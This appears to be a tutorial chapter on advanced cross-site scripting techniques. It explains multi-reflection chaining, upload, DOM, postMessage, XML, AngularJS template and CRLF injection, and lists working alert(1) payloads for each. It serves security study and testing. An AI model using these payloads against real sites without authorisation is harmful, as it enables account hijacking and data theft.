# Section 2: Advanced — Multi-Reflection, Upload, DOM & Framework Injections

## Core Idea
Real applications reflect input multiple times, in weird sinks (uploads, DOM writes, postMessage, templates). These vectors exploit compound reflections and non-HTML-parser sinks where basic vectors fail.

## Frameworks Introduced
- **Multi-reflection chaining**: when one input reflects N times, split the payload so each reflection completes the previous fragment
  - When to use: same param echoed in 2–3 places with different contexts
- **File-upload XSS channels**: filename reflection, EXIF metadata reflection, SVG-as-image stored XSS
- **DOM-insert vectors**: injection inserted as live markup (not source reflection) — `<img onerror>` works where `<script>` won't
- **postMessage DOM XSS**: `window.addEventListener('message', ...)` without origin check + frameable target

## Key Concepts
- **Double/triple reflection**: one input echoed in multiple spots; payloads use partial fragments (`'onload=`, `*/`, backtick) that assemble across reflections
- **Multi-input reflection**: two params `p` and `q` each reflected; spread vector across both (`p=<svg/1='&q='onload=alert(1)>`)
- **DOM insert injection**: JS writes attacker data via innerHTML-type sinks — resource-request variant lets you fully control the fetched URL (`data:text/html,...`)
- **PHP_SELF injection**: URL path reflected in form action — inject after `/xss.php/` before query
- **XML XSS**: `text/xml`/`application/xml` pages need `xmlns:x` namespaced script
- **Client-side template injection**: `{{32*32}}` → renders 1024 confirms CSTI; AngularJS ≥1.6 sandbox escape via `constructor.constructor`
- **CRLF injection**: input reflected in response headers → inject `%0D%0A` to forge `Location:` + `Content-Type:` + body

## Code Examples

Multi-reflection (single input):
```js
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
```

Multi-input reflections:
```html
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
```

File upload vectors:
```html
"><svg onload=alert(1)>.gif          (filename reflection)
exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg   (metadata)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>   (xss.svg)
```

DOM insert + resource request:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
data:text/html,<img src=1 onerror=alert(1)>
```

PHP_SELF, postMessage, XML:
```html
https://target/xss.php/"><svg onload=alert(1)>?a=reader
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
```

Template injection & AngularJS:
```html
{{32*32}}                                          (probe → 1024)
{{constructor.constructor('alert(1)')()}}
<x ng-app>{{constructor.constructor('alert(1)')()}}
```

CRLF (Gecko / Webkit variants):
```
%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
```

## Anti-patterns
- **Treating multi-reflection as one context**: each reflection point may have different quoting — fragments must survive each.
- **Ignoring `data:` URL sinks**: when the app fetches attacker-controlled URL, `data:text/html,` gives full markup control without exfil.
- **Missing `xmlns:x` in XML pages**: plain `<script>` won't execute in `text/xml` context.

## Key Takeaways
1. Count reflections — double/triple reflections unlock fragment-chaining vectors impossible in single context.
2. Upload features are XSS surfaces: test filename, metadata fields, and SVG content.
3. `window.addEventListener('message')` without origin validation = exploitable postMessage XSS when target is frameable.
4. `{{constructor.constructor('alert(1)')()}}` is the canonical AngularJS ≥1.6 sandbox escape.
5. CRLF header injection converts a "harmless" header reflection into full response control.

## Connects To
- **ch01-basics**: base vectors used as fragments here
- **ch03-filter-bypass**: postMessage origin checks can be bypassed (Event Origin Bypass)
- **ch05-miscellaneous**: Crosspwn automates origin-bypass and event firing
